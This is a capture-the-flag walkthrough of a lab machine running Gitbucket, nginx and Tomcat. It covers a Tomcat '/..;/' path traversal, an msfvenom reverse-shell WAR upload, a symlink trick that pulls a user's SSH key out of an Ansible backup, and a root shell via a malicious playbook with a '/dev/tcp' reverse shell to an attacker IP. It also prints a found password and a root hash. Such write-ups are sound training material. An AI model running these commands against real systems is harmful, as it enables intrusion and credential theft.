# Main points
* nginx and tomcat path traversal `/..;/` [#^57d812|tomcat apache 9.0.31](/assets/%23%5E57d812%7Ctomcat%20apache%209.0.31)
* `copy_link` of ansible can copy the target folder/file [#^0349ed|symlink whole folder](/assets/%23%5E0349ed%7Csymlink%20whole%20folder)
# Writeup
We start with basic nmap enumeration

- 22/tcp    open     ssh        syn-ack     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
- 443/tcp   open     ssl/http   syn-ack     nginx 1.18.0 (Ubuntu)
- 8080/tcp  open     http-proxy syn-ack

let's check the website

We see that port 8080 lands us on a Gitbucket login page and port 443 on a page with products and vegetable.

Let's create a new account in the Gitbucket page

We login with our account
![Pasted image 20210719010656.png](/assets/Pasted%20image%2020210719010656.png)

We see there is a root with 2 repo
![Pasted image 20210719163954.png](/assets/Pasted%20image%2020210719163954.png)

In the `seal_market` repository, we see there is an issue
![Pasted image 20210719164052.png](/assets/Pasted%20image%2020210719164052.png)
So there are 2 potential users `alex` and `luis`.
Let's check their commits in case there are some creds.

We find tomcat user
![Pasted image 20210719164536.png](/assets/Pasted%20image%2020210719164536.png)
`<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>`

Let's try to connect with those creds
![Pasted image 20210719164929.png](/assets/Pasted%20image%2020210719164929.png)

We have an error, maybe it's the password of alex or luis.

It worked with luis, but we can't do much now.

Let's check the port 443, where there is a seal market. We try to do some directory bruteforcing with gobuster.
![Pasted image 20210719170001.png](/assets/Pasted%20image%2020210719170001.png)
I checked them but apart from `index.html` they redirect to forbidden 403 error.

Except for the `/manager` that redirects to `/manager/html` which gives Forbidden 403. If i try to check `/manager/dashboard` for example, we get an error with a list of possible paths
![Pasted image 20210719170154.png](/assets/Pasted%20image%2020210719170154.png)

We try `/manager/text` and we get a prompt
![Pasted image 20210719170228.png](/assets/Pasted%20image%2020210719170228.png)

let's try the creds of tomcat 
It gives us access denied, we keep trying the other paths, and it works with /status

![Pasted image 20210719170422.png](/assets/Pasted%20image%2020210719170422.png)

We see the apache tomcat version is `Apache Tomcat/9.0.31 (Ubuntu)`

Let's see if there is a vulnerability for it.
We find this vulnerability that allows path traversal
https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
> Tomcat will treat the sequence **/..;/** as **/../** and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.

^57d812

So we try to access `/manager/status/..;/html`

We have access to dashboard
![Pasted image 20210719211910.png](/assets/Pasted%20image%2020210719211910.png)

We see that we can upload a WAR file
![Pasted image 20210719211929.png](/assets/Pasted%20image%2020210719211929.png)

Let's create a WAR reverse shell with msfvenom
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.127 LPORT=4444 -f war > reverse.war
```
![Pasted image 20210719212250.png](/assets/Pasted%20image%2020210719212250.png)

We start our netcat listener and we upload our WAR file

![Pasted image 20210719212336.png](/assets/Pasted%20image%2020210719212336.png)

Since we can't upload it directly because it redirects to /html which is forbidden, we use Burp to catch the request and change the path to `/manager/status/..;/html`
![Pasted image 20210719212719.png](/assets/Pasted%20image%2020210719212719.png)

Our file was uploaded and deployed
![Pasted image 20210719212753.png](/assets/Pasted%20image%2020210719212753.png)
![Pasted image 20210719212917.png](/assets/Pasted%20image%2020210719212917.png)
Now all we need is to access this URL
![Pasted image 20210719212953.png](/assets/Pasted%20image%2020210719212953.png)
And we have a shell
![Pasted image 20210719213013.png](/assets/Pasted%20image%2020210719213013.png)
We cat `/etc/passwd`
![Pasted image 20210719213137.png](/assets/Pasted%20image%2020210719213137.png)

There is user luis

Let's see if there are processes related to luis
`ps -aux | grep luis`
![Pasted image 20210719214919.png](/assets/Pasted%20image%2020210719214919.png)
There is a `gitbucket.war` running and there is a ansible-playbook running every 30 seconds
`sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml`
Let's see the content
![Pasted image 20210719220620.png](/assets/Pasted%20image%2020210719220620.png)
```yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```
The task "Copy Files" copies files from the `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` into `/opt/backups/files`

I dont know what `copy_links` refers to so let's check the documentation

![Pasted image 20210719221005.png](/assets/Pasted%20image%2020210719221005.png)

So if I understand that correctly, if we have a file in the src directory that has a symlinks to a file in /tmp/script, it will copy the /tmp/script to the backup folder ^0349ed

We also have read access to the backup folder
![Pasted image 20210719221417.png](/assets/Pasted%20image%2020210719221417.png)
And write access in the `/uploads/` folder in the src directory
![Pasted image 20210719221507.png](/assets/Pasted%20image%2020210719221507.png)
let's create a file with a symlink to the private key ssh of luis id_rsa in .ssh folder of luis
![Pasted image 20210719222134.png](/assets/Pasted%20image%2020210719222134.png)
`ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/`

We go to `/opt/backups/archives`, wait a little, and we see the recet backup created. let's download it by setting up a python server 
![Pasted image 20210719222418.png](/assets/Pasted%20image%2020210719222418.png)

![Pasted image 20210719222636.png](/assets/Pasted%20image%2020210719222636.png)
We download the archive
![Pasted image 20210719222709.png](/assets/Pasted%20image%2020210719222709.png)
and extract it with `gzip`

`gzip -d backup-2021-07-19-20:36:32.gz`
We have a tar archive, let's extract it
`tar xvf backup`
![Pasted image 20210719224538.png](/assets/Pasted%20image%2020210719224538.png)

We have our id_rsa file, we can get user by connecting with

`ssh luis@10.10.10.250 -i id_rsa`

We have user now and user flag

# Priv Esc
We run `sudo -l` to see if we can run something as root
we see we can run ansible as root

![Pasted image 20210719224923.png](/assets/Pasted%20image%2020210719224923.png)

So the idea is to create a malicious `yml` file and run it with ansible, this is easier than getting the user xD
`play.yml`
```yml
- hosts: localhost
  tasks:
  - name: Give root
    command: "/bin/bash ./script.sh"
```

`script.sh`
```bash
/bin/bash -i >& /dev/tcp/10.10.14.127/4444 0>&1
```
We setup our netcat listener and we run the command `sudo ansible-playbook play.yml`

![Pasted image 20210719230828.png](/assets/Pasted%20image%2020210719230828.png)

And we have root, and we get the flag
# root hash
`$6$D8b4qJlaLsRsvwuy$qvUFLUdvoH0EsvrLSJCpejOmV7bZoCO2ZGH2ueU77uAHpxepSfK.ts4LkkfwzuJ.IJ87EeK9RrNKHEorKQp3r`